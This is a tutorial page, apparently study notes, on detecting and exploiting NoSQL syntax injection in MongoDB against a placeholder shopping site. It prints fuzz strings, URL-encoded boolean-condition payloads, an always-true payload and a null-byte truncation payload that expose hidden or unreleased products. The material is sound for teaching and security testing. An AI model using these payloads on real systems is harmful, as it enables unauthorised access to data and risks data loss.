.. _ref_noSQLiSynt:

========================
NoSQL - Syntax Injection
========================

.. index::
   single: NoSQL injection; NoSQL - Syntax injection

.. contents::
    :depth: 3
    :backlinks: top

####

You can potentially detect NoSQL injection vulnerabilities by attempting to break the query syntax.
To do this, systematically test each input by submitting **fuzz strings and special characters that
trigger a database error or some other detectable behavior** if they're not adequately sanitized or
filtered by the application.

If you know the API language of the target database, use special characters and fuzz strings that
are relevant to that language. Otherwise, use a variety of fuzz strings to target multiple API
languages. 

####

-------------------------------------
Detecting syntax injection in MongoDB
-------------------------------------

    .. note:: 
        
        Consider a shopping application that displays products in different categories. When the
        user selects the **Fizzy drinks category**, their browser requests the following URL: 

        .. code:: urlencoded
            :number-lines:
            :force:

             https://insecure-website.com/product/lookup?category=fizzy

        
        This causes the application to send a JSON query to retrieve relevant products from the
        product collection in the MongoDB database: 

        .. code:: JavaScript
            :number-lines:
            :force:

             this.category == 'fizzy'


        To test whether the input may be vulnerable, submit a fuzz string in the value of the
        *category* parameter. An example string for MongoDB is: 

        .. code:: JavaScript
            :number-lines:
            :force:

             '"`{
             ;$Foo}
             $Foo \xYZ


        Use this fuzz string to construct the following attack: 


        .. code:: urlencoded
            :number-lines:
            :force:

             https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00


        If this causes a change from the original response, this may indicate that user input isn't
        filtered or sanitized correctly.

        **N.B**: In this example, we're injecting the fuzz string via the URL, so the string is 
        **URL-encoded**.


    .. important:: 
        
        NoSQL injection vulnerabilities can occur in a variety of contexts, and you need to adapt
        your fuzz strings accordingly. Otherwise, you may simply trigger validation errors that mean
        the application never executes your query.

        In some applications, you may need to inject your payload via a **JSON property** instead.
        In this case, this payload would become . 

        .. code:: json
            :number-lines:
            :force:

             '\"`{\r;$Foo}\n$Foo \\xYZ\u0000

Determining which characters are processed
==========================================

    .. note:: 
        
        To determine which characters are interpreted as syntax by the application, you can inject
        individual characters. For example, you could submit **" ' "**, which results in the
        following MongoDB query: 

        .. code:: JavaScript
            :number-lines:
            :force:

             this.category == '''

        If this causes a change from the original response, this may indicate that the **" ' "**
        character has broken the query syntax and caused a syntax error. You can confirm this by
        submitting a valid query string in the input, for example by escaping the quote:
        
        .. code:: JavaScript
            :number-lines:
            :force:

             this.category == '\''

        If this doesn't cause a syntax error, this may mean that the application is vulnerable to an
        injection attack.

Confirming conditional behavior
===============================

After detecting a vulnerability, the next step is to determine whether you can influence boolean
conditions using NoSQL syntax. 

To test this, send two requests:

    * One with a false condition 
    
    * One with a true condition.
    

    .. note:: 
        
        For example you could use the conditional statements **' && 0 && 'x** and **' && 1 && 'x**
        as follows: 
        
        .. code:: urlencoded
            :number-lines:
            :force:

             # False condition
             https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x

             # True condition
             https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x


    .. important:: 
        
        Make sure to **URL Encode"** the payload
        
        .. code:: urlencoded
            :number-lines:
            :force:

             # payload without URL encoding
             ' && 0 && 'x

             # payload URL URL encoded
             %27+%26%26+0+%26%26+%27x



If the application behaves differently, this suggests that the false condition impacts the query
logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a
server-side query. 

Overriding existing conditions
==============================

Now that you have identified that you can influence boolean conditions, you can attempt to override
existing conditions to exploit the vulnerability.

    .. note:: 
        
        For example, you can inject a JavaScript condition that always evaluates to true, such as
        **'||1||'**: 
        
        .. code:: urlencoded
            :number-lines:
            :force:

             https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27

        This results in the following MongoDB query:
                
        .. code:: JavaScript
            :number-lines:
            :force:

             this.category == 'fizzy'||'1'=='1'

As the injected condition is always true, the modified query returns all items. This enables you to
view all the products in any category, including hidden or unknown categories.

    .. warning:: 
        
        Take care when injecting a condition that always evaluates to true into a NoSQL query.
        Although this may be harmless in the initial context you're injecting into, it's common for
        applications to use data from a single request in multiple different queries.
        
        If an application uses it when updating or deleting data, for example, this can result in
        accidental data loss. 


You could also add a null character after the category value. MongoDB may ignore all character
after a null character. This means that any additional conditions on the MongoDB query are ignored.

    .. note:: 

        For example, the query may have an additional **this.released** restriction: 
        
        .. code:: JavaScript
            :number-lines:
            :force:

             this.category == 'fizzy' && this.released == 1

        The restriction **this.released == 1** is used to only show products that are released. For
        unreleased products, presumably **this.released == 0**.

        In this case, an attacker could construct an attack as follows: 

        
        .. code:: urlencoded
            :number-lines:
            :force:

             https://insecure-website.com/product/lookup?category=fizzy'%00

        This results in the following NoSQL query: 
        
        .. code:: JavaScript
            :number-lines:
            :force:

             this.category == 'fizzy'\u0000' && this.released == 1

If MongoDB ignores all characters after the null character, this removes the requirement for the
released field to be set to 1. As a result, all products in the fizzy category are displayed,
including unreleased products. 

####

--------
Weblinks
--------

.. target-notes::